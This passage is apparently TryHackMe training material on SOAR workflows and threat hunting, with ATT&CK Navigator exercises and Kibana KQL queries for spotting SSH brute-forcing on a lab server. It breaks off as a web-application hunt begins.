![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/4061c2f9af0d5011cc33e13497b236fe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/4061c2f9af0d5011cc33e13497b236fe.png)

# Security Automation

As workflows are developed with orchestration, repeatable patterns
will emerge. Automation comes into play at this point and
becomes a “must-have” element in dealing with complex tools and
information flows. Automation goes beyond just laying out the necessary
action steps to handle a security event and offer preventive measures.
It is meant to provide additional insights into threat response and
allow security teams to adopt and customise the response workflows to
reduce handling time.

# Security Response

Once security incidents are detected and analysed, a triage plan
must be set in motion to avert damages from any adversary. This
requires analysts to identify the appropriate steps to contain and
remediate the threat. With the help of automation, incident response
processes can be executed seamlessly.

# SOAR

SOARs are commonly compared with SIEMs and are deployed alongside
each other. Let us analyse some key differences between these
technologies:

| **SOAR** | **SIEM** |
| --- | --- |
| Fetches threat feeds from SIEM, threat intelligence, endpoint
security. | Centrally collected log and event data from security, network,
server and application sources. |
| Collects security alerts and intel using a centralised platform. | Generates alerts to be assessed by analysts. |
| Orchestration and automation ensure less human intervention when
addressing threats. | More human intervention is required to manage rules, use cases and
alerts. |
| Employs workflows and playbooks to ensure end-to-end response
automation. | Limited response workflows result in longer response times. |

# SOAR

The SOAR capabilities run efficiently through
**playbooks.** A security playbook is a structured
checklist of actions used to detect, respond and handle threat
incidents. Another common terminology for them is a **standard
operating procedure (SOP).** Playbooks assist SOC teams in having
an end-to-end process of handling routine incidents and establishing
repeatability and metrics for the response. We shall look at some SOAR
playbook uses in the next task.

On the other hand, we have **runbooks** which are
predefined procedures to achieve a specific outcome and have a high
degree of automation. Runbooks can include human decision elements
depending on the level of automation applied.

# Workflow of a

Putting together the SOAR capabilities, a typical workflow would look as follows:

- **Detection**: A security
event may be triggered and detected by an integrated security system
such as a network intrusion detection system (NIDS) or a SIEM.
- **Enrichment**: Threat intelligence would be gathered from feeds, reports and other
sources to provide additional context about the event, such as the tactics, techniques and procedures (TTPs). SOC analysts can use the orchestrated data to conduct deeper investigations.
- **Triage**: The SOAR would analyse the event, determining its severity and potential impact on the organisation. This reduces the Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) to security incidents.
- **Response**: Automated actions are set in motion to contain the threat and mitigate
any potential damage. For example, implemented playbooks could trigger
the isolation of compromised systems or block identified malicious IP
addresses. A new level of enhanced incident response.
- **Remediation**: Root cause analysis of the event is done through the coordinating
efforts of security analysts and incident responders. Additionally,
patch management operations and vulnerability upgrades are automated
efficiently.
- **Reporting**: Communication and reports about the incident and remediation are standardised to ensure a reliable and repeatable flow of information involving both internal and external stakeholders. Actionable metrics may also be extracted.

# SOAR

With the understanding that all 
aspects of a security incident should be managed from a single platform,
 some notable factors to look out for when sourcing a SOAR solution include the following:

- Open integration with existing
security and IT tools out-of-the-box. Future integrations with new or
custom technologies should also be considered.
- They provide a streamlined collaboration, smooth handoffs and escalations to support day-to-day SOC operations.
- Operations dashboards that provide analysts with capabilities to build, customise
and test playbooks to improve the incident response processes.
- Role-based KPI dashboards and reporting libraries are available to support measuring and improving SOC performance.
- Automatically correlate and combine related alerts from multiple tools to minimise
false positives and eliminate alert fatigue on analysts.

**SOAR Workflows**

# Phishing

**Scenario**: THM Corp employees have recently received
numerous suspicious emails and have reported them to the SOC team for
investigation. As the lead analyst, you wish to develop an automated
workflow to analyse email files and perform case management using
various security tools.

Phishing attacks remain the most common attack vector used in
breaches. Unfortunately for security analysts, investigating phishing
emails becomes time-consuming and involves manual exercises such as
analysing attachments and URLs. SOAR solutions can execute
these tasks in the background while other investigations are ongoing.
Additionally, remediation can be performed when a positive phishing email
is identified.

Now, what would this workflow look like? Let's build a flow of events
using our scenario as a security analyst assigned to the incident.

1. The suspected emails have been received and isolated in a sandbox
environment prepared for such events.
2. A trigger is executed to create a ticket on the case management
solution (such as TheHive). This will allow for better documentation and
follow-up on the incident.
3. Parse the email for URLs, attachments and other possible IOCs. If
any IOCs are present, they will be extracted.
4. File hashes will be generated for extracted attachments.
5. A VirusTotal trigger is executed to analyse extracted URLs and file
hashes.
6. In the event there are no results from VirusTotal, a manual email analysis has to be done to ensure whether it is malicious.
7. Malicious outcomes from automated or manual analysis trigger a
deletion of the malicious email and a communication notification to the
organisation.
8. The incident ticket is updated with IOCs' results and reports
generated.
9. End of workflow.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/750415d37d5d45da28ea0f83d3754857.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/750415d37d5d45da28ea0f83d3754857.png)

## CVE Patching

**Scenario:** A new CVE report has been received. As the
lead SOC analyst, you need to establish a workflow that will analyse the
CVE details, assess its risk threshold, create a patching ticket and
test the patch before being pushed to the production environment.

The Common Vulnerabilities and Exposures (CVE) is a classification
list for publicly disclosed vulnerabilities based on a scoring system
that evaluates the threat level of the vulnerability. If you need a
refresher on vulnerabilities, check out the room [Vulnerabilities 101](https://tryhackme.com/room/vulnerabilities101).

As a security analyst, you must always be on the lookout for
publications on new CVEs and remediation plans. The process can become
overwhelming, resulting in a mounting backlog and patches not being
applied, leaving the environment more vulnerable.

SOARs can be used to orchestrate and automate vulnerability
management processes, addressing critical issues based on released
security advisories in a timely and efficient manner. The workflow for
this scenario can be detailed as follows:

1. The SOAR monitors advisory lists and pulls details, extracting any
new CVE data.
2. The SOAR queries the internal patch management system if the
received CVE has been seen before and patched.
3. If CVE has been addressed, end workflow. If not, the CVE will be
assessed to see if it applies to any assets.
4. If CVE is applicable, a tracking ticket is created and assigned to
an analyst. If not, the patch management system is updated with the
information, and the workflow ends.
5. For a created CVE Ticket, the SOAR will compile a list of assets
needing patching against the CVE.
6. The patch management system is queried for the presence of the patch. The database is updated with the latest patch
information if the patch is not present.
7. The SOAR creates virtual test environments to test the patch. The patch is applied, and test metrics are logged.
8. The SOAR updates the CVE ticket with test outcomes and notes success and
failure rates.
9. The patch is deployed to production assets. The analyst verifies the rollout
of the patch.
10. The SOAR conducts a vulnerability scan against the patched assets
for the CVE. The analyst develops and deploys a mitigation plan if assets are still vulnerable.
11. The CVE ticket is closed, vulnerabilities cleared, and patch
management is updated with the CVE addressed.
12. End workflow.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f33c952ffab8386408066e3fd7aef70a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/f33c952ffab8386408066e3fd7aef70a.png)

## **THREAT HUNTING AND EMULATION**

# Threat Hunting Introduction

Threat hunting is an 
approach to finding cyber security threats where there’s an active 
effort done to look for signs of malicious activity. In its most basic 
form, that is the definition of Threat Hunting; however, in order for us
 to really understand what it entails as well as what its actual role is
 in the organisation, we will start by contrasting it with Incident 
Response.

# Threat Hunting in Contrast with Incident Response

Incident Response (IR) is innately 
reactive. The action, or “response”, is triggered by an initial 
notification or alert. This initial notification is first triaged, then 
analysed, and when enough pieces of evidence point to malicious 
activity, it is deemed an incident that needs to be responded to and 
dealt with accordingly.

More information about Incident Response, particularly the initial stages of it, is discussed in the [Preparation Room](https://tryhackme.com/room/preparation) of the IR Module.

Threat
 Hunting, on the other hand, is innately proactive. There is no actual 
‘trigger’ that would mobilise a hunt, except for the pursuit of building
 the strength of the organisation’s security posture, guided by Threat 
Intelligence.

A stark 
contrast can be seen here - while both are guided by the goal of 
ensuring the security of the organisation, the forces that drive the 
reactive and proactive nature of Incident Response and Threat Hunting, 
respectively, hardly share the same direction. This is further steered 
by the specific objectives that each aims to achieve.

| **Reactive Approach** | **Proactive Approach** |
| --- | --- |
| Incident Response | Threat Hunting |
| Triggered by an initial notification / alert | Active search for suspicious events that can become incidents |
| Guided by the initial scope of the incident | Guided by Threat Intelligence |
| "There's a threat that needs to be dealt with now." | "There might be a threat that we don't know yet." |

Usually,
 organisations start doing threat hunts when there’s already an 
established IR process as well as detection mechanisms in place, but 
they think that incidents aren’t being detected early enough. In the 
case of advanced threats, or even well-made red team exercises, there 
will always exist ways to go through your organisation undetected.

Threat
 Hunting aims to bridge this gap, constantly finding ways to add and 
improve the current detection mechanisms in place so that future similar
 bad behaviour will automatically be detected immediately. More so, 
during that process, detected threats go immediately to the Incident 
Response team. The trigger for their mobilisation are the findings from 
the Threat Hunt, and consequent findings from the IR process may steer 
the Threat Hunting team to further find bad behaviour.

This
 classic example shows the beauty of the synergy between two seemingly 
different approaches to ensuring one specific goal is met - 
strengthening the organisation’s security posture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/2f47a4116acd75308c01626af6a50c64.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/2f47a4116acd75308c01626af6a50c64.svg)

**Threat Hunting Mindset**

How
 you approach a task would usually dictate how successful you will be. 
It’s easy to rely on the most cutting-edge pieces of technology being 
offered out there, but across the industry, people would always be the 
most important part of any security team. And so, while thinking of 
equipping ourselves with the best tools is important, investing time 
(and probably money) in learning the proper mindset is as significant.

# What's the basis for our hunt?

It
 is imperative that we start our hunt with leads comprised of accurate 
pieces of information such as known relevant malware as well as trusted 
Threat Intelligence. Through leads, we give threat hunters better 
chances of achieving amazing things, from easy wins like looking for 
malicious binaries to more complex hunting projects like finding 
patterns of activity of certain groups that target organisations similar
 to us or industries we’re part of.

Threat Intelligence

Since
 we’re talking about dictating the direction of a hunt, it’s essential 
that we arm ourselves with critical information that will let us know 
more about the threat(s) that we may be dealing with. Understanding the 
bad that we may be dealing with is akin to knowing how they might behave
 within our environment, possibly allowing us to narrow down our search 
to specific sweet spots such as specific pieces of data they might be 
interested in, or even knowing which groups or APTs might be 
particularly interested in targeting us.

Unique Threat Intelligence

Intelligence
 on threats that you are able to develop internally is a very valuable 
asset to have. Not many organisations have the kind of intrusion 
experience that would allow them to study and develop usable 
intelligence from said intrusion and even fewer have the capability of 
developing it internally. Furthermore, intelligence of this kind may 
have the characteristic of being ultimately unique to your organisation.

Indicators
 of Compromise (IOCs) specifically documented on previous intrusions 
would be the most obvious and straightforward example for this one. IOCs
 immediately give value not only to your threat hunters but also to your
 detection mechanism, as they’re actual traces of an adversary. Through 
this, re-intrusions of that specific adversary or other adversaries that
 employ the same tactics would be easier to spot.

Threat Intelligence Feeds

As
 touched upon above, not a lot of organisations are capable of 
developing valuable and actionable Threat Intelligence internally. While
 a lot of organisations have their fair share of intrusions, not 
everyone has that kind of experience under their belt which allows them a
 front-row seat to a specific adversary’s IOCs, among others. More so, 
it involves a lot of money, skill, and effort to be able to become an 
efficient Threat Intelligence producer.

It
 is not the end for the rest of us, as we can learn from other Threat 
Intelligence producers via Threat Intelligence feeds. There exist 
intelligence feeds that are both readily and publicly available. One of 
the most popular examples of this one is the MISP, an open-source Threat
 Intelligence and sharing platform. You may learn more about [MISP here](https://tryhackme.com/room/misp).

On
 the other hand, there are also paid resources that specialise in 
producing intelligence, some of which are capable of creating tailored 
intelligence for your organisation. Some examples of this are [Recorded Future](https://www.recordedfuture.com/) and [ReliaQuest](https://www.reliaquest.com/blog/category/threat-intelligence/).
 These kinds of services are not cheap, and gaining a license would 
typically cost an arm; however, in the hands of a capable Threat 
Intelligence analyst, the insights that you would be able to gain would 
be extraordinary.

| **General Hunting Guide** | **Examples** |
| --- | --- |
| Unique Threat Intelligence | Indicators of Compromise |
| Threat Intelligence Feeds | MISP
Recorded Future
Digital Shadows |

**Threat Hunting Process**

# What do we hunt for?

The answer to this question 
dictates the direction of the hunt. As the hunt progresses, the threat 
hunter will always go back to this question, ensuring that pieces of 
evidence that link to its answer are gathered.

The discussion regarding the examples below also falls under the wide-reaching topic
 of Threat Intelligence discussed in the previous task. However, they 
are valuable enough to deserve to be highlighted on their own. These
 highlights are more focused on the kind of intelligence where their 
usage would merit immediate value to the hunt. They are straightforward,
 specific, and immediately actionable if successfully found.

Known Relevant Malware

The
 internet is ripe with known malware samples, and a lot of them have 
publicly available published analyses. One example of leveraging this 
kind of intelligence is to take a closer look at your organisation, 
identify the relevant threat actors that might take an interest in you, 
and hunt for traces of the malware that they use in their toolkits 
within your organisation.

The
 example above may be a bit general. Still, once you identify what is 
relevant to your organisation, it would be a lot more straightforward to
 narrow down the samples that you want and consequently hunt for their 
traces within the scope of your visibility.

One example of a live malware repository is [theZoo](https://github.com/ytisf/theZoo),
 where you may play with live malware and gain insights into how they 
will work within specific environmental conditions. Malware 
characteristics and analysis are constantly being published as well, and
 a good example worth exploring is [Trend Micro’s Threat Encyclopedia](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/).

Attack Residues

Attack
 residues are a great starting point as well, especially if you think 
that an attack has happened already. It works particularly well with 
good Threat Intelligence as it would be as straightforward as ticking 
off a list of attack residues to check for within the environment.

The
 challenging part here, however, is knowing your environment well enough
 to be able to separate attack residues from normal behaviour. A lot of 
attack residues blend well with normal environmental noise. Pair this 
with a more advanced adversary who knows how to clean up after 
themselves or even worse - employ tactics that are already stealthy from
 the get-go, and the hunt is suddenly not as straightforward as it 
seems.

Overall,
 it’s still a good way to cover our bases; remember that we only need to
 catch them making a mistake once while they need to constantly be 
perfect in their movements.

Known Vulnerabilities of Products/Applications Being Used

Threat
 actors are quite creative in finding vulnerabilities and 
misconfigurations in the products and applications that their target 
organisation use. As such, at the very least, known
 vulnerabilities of assets should be actively hunted and patched 
accordingly. You might even stumble upon a threat actor actively 
exploiting your vulnerable assets, effectively catching 2 birds with one
 effort.

The
 organisation should be extra vigilant for announcements of zero-day 
vulnerabilities that may be affecting these assets. Immediate checks 
should be done on:

1. If the current version really is vulnerable, and
2. If there are traces of the vulnerability being exploited for as long as historical data may allow.

These
 hunts are a great way to retroactively check the exploitation of 
vulnerable assets while also ensuring that the assets of the 
organisation are all patched and up to date with the current security 
standards.

| **General Hunting Guide** | **Examples** |
| --- | --- |
| Known Relevant Malware | theZoo (repository)
Threat Encyclopedia |
| Attack Residues | Indicators of Attack
Indicators of Compromise |
| Known Vulnerabilities | Zero-day Vulnerabilities
CVEs |

The
 discussion above is a general discussion of usual threat hunt targets 
and is in no way an exhaustive list, albeit the list above is a good 
place to start. Every organisation has their own quirks and unique 
characteristics that must also be factored in whenever a hunting task or
 project is tackled.

# How do we hunt for it?

Reviewing the array of information,
 factors, and other elements for consideration above would hopefully 
lead us to understand the target of our hunt. Now that we know what we 
want to hunt for, “How do we hunt for it?” is the sensible next 
question.

This section will not touch 
upon hunting theories and specific hunting techniques - these will be 
discussed in the next few rooms; rather, we will be focusing on the 
driving force that these theories and techniques are based on.

Attack Signatures and IOCs

Upon
 identifying the subject of the hunt, it’s imperative that we ensure 
that we characterise them into specific and actionable identifiers by 
which we will immediately recognize. This is done most effectively via 
Attack Signatures and IOCs.

By
 condensing the “whats” of the hunt down to Attack Signatures and IOCs, 
we suddenly have a set of information that we can then immediately 
compare to our available historical data. This makes it easier to find 
objects of interest such as relevant malware, attack residues, and even 
exploitation of known vulnerabilities. Keep in mind that we do need to 
know how the environment behaves and consequently, what the logs would 
look like when said vulnerability has been exploited.

Logical queries

Some
 hunting projects are best accomplished via logical queries. A 
straightforward example of this one is hunting for assets that have 
known vulnerabilities.

Applying
 what we’ve discussed above - characterising the vulnerable assets via 
specific actionable identifiers, such as the application version, would 
allow us to craft logical queries that filter for these identifiers. 
This essentially gives us low-hanging fruits for easy pickings that, at 
the same time, impact the organisation’s security posture directly.

Patterns of Activity

At
 the end of the day, when we’ve already narrowed down the specific bad 
(e.g. relevant threat actors, etc.) that we want to focus on, the next 
sensible step is to characterise their behaviour through patterns of 
activity that they are inclined to make. In any conversation regarding 
this, the [MITRE ATT&CK Matrix](https://attack.mitre.org/) has always been a top resource, and it may as well be the star of the show here.

**Practical Application**

For our purposes, let’s focus on the [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/).
 The ATT&CK Navigator is a tool designed to make it easier “to 
visualise your defensive coverage, your red/blue team planning, the 
frequency of detected techniques or anything else you want to do.” Not 
only does it show the specific attack techniques that we should look 
for, but it also gives an idea of how an attack flows, and it shows it 
in a visually appealing way. The
 ATT&CK Navigator will be used to answer the questions in this task.
 If you haven’t already done so, please click on the link provided.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/96fa91e4e9de6ad2fbe2c79f2034aba1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/96fa91e4e9de6ad2fbe2c79f2034aba1.png)

The attack navigator landing page looks like this. Let’s proceed by clicking on Create New Layer → Enterprise. This should show you a blank ATT&CK Navigator page.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/2e39eedfc80c3b7f1f8ced80f6d74337.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/2e39eedfc80c3b7f1f8ced80f6d74337.png)

Select
 the magnifier glass under “selection controls”, and then type 
“WannaCry” inside the search bar. The “Software” part of the results 
should show 1 result. Click on the “select” button beside the result.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/15f35df9a157f3718e8f9a6cac0660c1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/15f35df9a157f3718e8f9a6cac0660c1.png)

It should then show something like this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/3e20642b461d5e026b348d3b2a227c34.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/3e20642b461d5e026b348d3b2a227c34.png)

To
 better visualise our selection, select a background colour under 
“technique controls”. It will immediately fill the selected techniques 
with the colour of your choice. Let’s also set an arbitrary score of 1 
for this layer, the control for which is beside the background colour, 
still under the “technique controls”. Finally, we can set a name for 
this layer by editing the layer information under “layer controls”. It 
should look something like this. Take note that hovering on the 
technique should show the score.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/7286e72831f77dfbf57edd04559b4d8d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/7286e72831f77dfbf57edd04559b4d8d.png)

Now,
 in the same ATT&CK Navigator, repeat all these steps for two more 
threats: Stuxnet and Conficker. You can do this by simply clicking on 
the “+” button on top of the page and then repeating the same process 
we’ve outlined above. This time, set a score of 2 for Stuxnet and 4 for 
Conficker. This way, when we stitch all of these layers together, we’ll 
know exactly which threats employ the same technique by looking at the 
aggregate score.

Once
 you’ve repeated the steps above for both Stuxnet and Conficker, let’s 
proceed by clicking on the “+” button → “Create Layer from other 
layers”, choose “Enterprise ATT&CK v14” under “domain”, and then put
 “a+b+c” on the “score expression”. Let’s skip all of the other settings
 and hit Create at the bottom of the page.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/e446d2029de929566a3d38a54afd256a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/e446d2029de929566a3d38a54afd256a.png)

This will
 create a new layer composed of the 3 other layers stitched into one in 
order to better visualise the impact of multiple threat actors that are 
relevant to your organisation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/57e5bd1b4129ba0931a981505f1df185.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/57e5bd1b4129ba0931a981505f1df185.png)

By
 default, it would look something like this. A few changes on the colour
 setup under “layer controls” would transform it into something like 
this:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/af48c233ee1a9f30006c3be005530220.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/af48c233ee1a9f30006c3be005530220.png)

The
 differing colours are set to be able to immediately see which common 
tactics or techniques these threat actors share. A deep red colour means
 it’s common to all of them, while the other lighter colours mean it’s 
either one or any combination of two threat actors. The scores are 
arbitrary, and you can set them in terms of relevance to your 
organisation or just random if you just intend to play around with the 
tool visually. Questions at the end of this task would be related to 
this specific ATT&CK Navigator layer.

These
 tools and resources at hand would allow for a more straightforward 
approach to identifying patterns of activity. Once we’re satisfied with 
the way we’ve characterised the relevant threats that we wanted to focus
 on, we can then start hunting. This intelligence-driven approach of 
characterising threat actor behaviour through their TTPs is one of, if 
not the best, way to go about hunting. It immediately gives value to the
 hunt, and it’s sensible, straightforward, and actionable.

MITRE
 has done a lot, not only within the cyber security sphere but also in 
subjects that generally help build a “safer world”. For more information
 on what MITRE has to offer, albeit, in the cyber security industry, you
 may head over to the [MITRE room](https://tryhackme.com/room/mitre).

# When do we decide to move on?

The
 single biggest challenge in Threat Hunting is knowing when to decide to
 move on to other things. When will you know you’re done with it? Here’s
 a Capture the Flag (CTF) analogy.

In
 CTFs, you immediately know before you even start that by the end of it,
 if you do everything right, there will be a flag waiting for you. If 
you aren’t able to get the answer, that just means that you need to 
study more and further improve so that the next time you tackle a 
similar problem, you’ll have more chances of capturing that flag. That’s
 not necessarily the case for Threat Hunting. It’s completely possible, 
and even more probable than not, that you do everything right and not 
find anything.

It
 will be normal to feel inadequate - there will always be internal doubt
 when hunting for threats. But as long as you follow your processes, 
especially with a hunting plan that’s intelligence-driven, you should be
 fine.

**Goals**

So far, 
we have talked about the Threat Hunting concept, as well as the whats, 
the hows, and even the whens behind the Threat Hunting mindset; now it’s
 time to talk about the whys.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d2912b4f493d14946c62ca8834110cfc.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/d2912b4f493d14946c62ca8834110cfc.svg)

# Proactive Approach to Finding Bad

Threats are one of the constants in the world of 
security. There will never be a shortage of malicious actors, from 
Script Kiddies to well-funded Advanced Persistent Threats. There will 
always be someone snooping around your environment, and with that in 
mind, it is imperative that you find them first and you find them fast, 
ideally before they are able to do what they set out to do.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/3fcddd248ec0fdd111da0bd9790c411f.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/3fcddd248ec0fdd111da0bd9790c411f.svg)

# Discover Pre-existing Bad

Through complex and sophisticated attack chains, chance, or 
even mere luck, it is a reality that some activities of malicious actors
 may slip through an organisation’s detection mechanisms. In that sense,
 similar kinds of activities are essentially undetectable; however, they
 are not invisible. It’s just that detection mechanisms haven’t yet been
 developed to automatically flag these activities.

It is through 
Threat Hunting that we’re able to find these activities, and upon such 
discovery, it will consequently (and quite immediately) trigger an 
Incident Response. These learnings will ultimately be fed back to the 
continuous monitoring process of the SOC (see last section).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/0f0e3e6f19e6a3510ab6327d48486cda.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/0f0e3e6f19e6a3510ab6327d48486cda.svg)

# Minimise the Dwell Time of Attackers

Another byproduct of undetected threat actor activity is 
having essentially a 'free pass' to further snoop around within the 
environment. The longer a bad actor has access to your environment, the 
more opportunities they have to further learn about it. With a deeper 
understanding of the environment, an attacker may execute more 
sophisticated ways of persisting within the environment, cause bigger 
damage to important assets and/or information, and steal more data.

The
 primary goal of Threat Hunting is to minimise a threat actor's dwell 
time. Ultimately, security is the business of ensuring the 
confidentiality, integrity, and availability of the organisation’s 
assets, and minimising dwell time also minimises the damage a threat 
actor might have already caused.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4c5eaf97bc0d7a2f2279111f9193fc7a.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4c5eaf97bc0d7a2f2279111f9193fc7a.svg)

# Develop Additional Detection Methods

In the end, we want to be able to use all of these findings as
 feedback to our continuous monitoring process. Security is a continuous
 development process, so we wouldn’t want to hunt for the same threats 
over and over again. Instead, once we’ve profiled threats that were 
previously undetectable by current detection methods, an effort should 
immediately be poured into translating these profiles into detection 
mechanisms. In effect, future similar threats will be immediately 
detected and actioned upon.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/b5b5a2d96a517e4e748fa884b46d310c.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/b5b5a2d96a517e4e748fa884b46d310c.svg)

## Threat Hunting: Foothold

**Initial Access**

# Tactic: Initial Access

The [Initial Access Tactic (TA0001)](https://attack.mitre.org/tactics/TA0001/)
 represents adversaries' techniques and strategies to breach an 
organisation. This stage of an attack cycle predominantly focuses on 
delivering the payload to the target system or network. The primary 
objective during this phase is to gain a foothold in the network, which 
can be achieved through a variety of means, such as:

- Social Engineering techniques such as phishing.
- Exploiting vulnerabilities through public-facing servers.
- Spraying credentials through exposed authentication endpoints.
- Executing commands through malicious flash drives.
- Installing cracked software with hidden malicious code.

# Understanding the Tactic

The
 techniques adversaries use are not limited to the provided examples 
above, as there are more ways to get an initial foothold. However, we 
will use these examples to understand this tactic and grasp how to hunt 
it.

The common intersection of the given examples above is gaining initial access to either of the following:

- Account access via a valid credential
- Machine access via a remote code execution

| **Initial Access Technique** | **Access Gained** | **Examples** |
| --- | --- | --- |
| Social Engineering via Phishing | Account / Machine | Attacking
 targets through an email with a link redirecting to a phishing website 
(credential harvesting) or with a malicious email attachment (malware 
executable). |
| Server Exploitation | Machine | Attacking publicly-available servers prone to remote code execution. |
| Credential Spraying | Account | Sending many authentication attempts using various combinations of usernames and passwords. |
| Malicious Flash Drive | Machine | Dropping a malicious flash drive lets users inject it into their workstations to achieve a malicious compromise. |
| Cracked Software Installation | Machine | Publishing malicious cracked software lets the targets install a trojanized backdoor to achieve remote access. |

Given
 the information above, it is more apparent now that the foothold does 
not explicitly pertain to a workstation but rather anything that can be 
leveraged to access the target infrastructure. Moreover, the examples 
focus on varying ways to deliver the attack to obtain successful initial
 access.

# Hunting Initial Access

Now
 that we have a deeper understanding of the Initial Access tactic and 
how adversaries might attempt to gain a foothold in an organisation's 
network or system, our next focus is hunting these initial access 
attempts. This process involves actively pursuing and investigating 
intrusion attempts, guided by a deep understanding of the attacker's 
methodology.

As the attack techniques are varied, our hunting 
strategies should also be multifaceted and adaptable. Our goal is to 
identify signs of the various methods outlined above. Hence, we will use
 the following scenarios to build our hunting methodology:

- Brute-forcing attempts via SSH.
- Exploitation of a web application vulnerability.
- Phishing via links and attachments.

# Brute-Forcing via SSH on Jumphost

Starting with this scenario, we will use the `filebeat-*` index and hunt for brute-forcing attempts via SSH on our `jumphost` server on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Brute-forcing
 attacks are focused on authentication events, which generate several 
failed attempts before successfully retrieving a valid credential. We 
will hunt for behaviours that satisfy this idea.

To start hunting, use the **Visualize Library** from the left sidebar and create a visualisation table using Lens.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5a69357f18ae726a6cb0f64b2372f13e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5a69357f18ae726a6cb0f64b2372f13e.png)

Next, configure the table with the following setup:

1. Set the timestamp to July 3.
2. Set the index to filebeat.
3. Set the Table Index (filebeat), Rows (source. ip and user. name), and Metrics (count).
4. Use the KQL query to list all failed SSH auth events on the Jumphost server:`host.name: jumphost AND event.category: authentication AND system.auth.ssh.event: Failed`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a7729d0aa83bae1e45489b4d8697432e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a7729d0aa83bae1e45489b4d8697432e.png)

***Click to enlarge the image***

Upon
 checking the results above (highlight #5), it can be observed that the 
table provided the count of failed login attempts on specific users, 
including the source of the attack. These two IP addresses and accounts 
are highly notable since they generated over 500 failed authentication 
events within the given timeframe.

Now that we have gathered 
significant information about brute-force attempts, let's find a 
successful authentication. By doing this, we can verify if the attacks 
yielded successful results; in this case, the attacker accessed the 
Jumphost server successfully via SSH. To do this, we can replace the KQL
 query with the following:

`host.name: jumphost AND 
event.category: authentication AND system.auth.ssh.event: Accepted AND 
source.ip: (167.71.198.43 OR 218.92.0.115)`

This query focuses on the top 2 IP addresses where the SSH authentication event was **Accepted** using a valid credential.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0bc2a6d4be366ddd0bf59c7538e42f86.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0bc2a6d4be366ddd0bf59c7538e42f86.png)

***Click to enlarge the image***

Now that we have confirmed that the attacker from `167.71.198.43` accessed the Jumphost server using the `dev`
 account, we have successfully hunted an intrusion attempt on this 
server. Following a threat hunter's mindset, the next step of this 
investigation is to identify the commands issued by the `dev` user after authenticating via SSH.

On
 a footnote, it is not always the case that brute-forcing activities are
 the only indicators of unusual logon activity. Hunting can also be done
 in another way wherein you will hunt for successful authentication via 
SSH, differentiate the authentication source (IP address) and correlate 
the unusual activity after the successful execution to see potential 
intrusion attempts.

# Remote Code Execution on Web01

In the following scenario, we will use the `packetbeat-*` index and hunt for suspicious actors attacking our web application (`web01`) on July 3, 2023. Ensure all queries to the Kibana console are set to look for the right index and timeframe.

Web
 application attacks typically start with enumeration attempts and 
proceed with exploiting discovered vulnerabilities. We will hunt for 
behaviours that satisfy this idea.

To start hunting, use the 
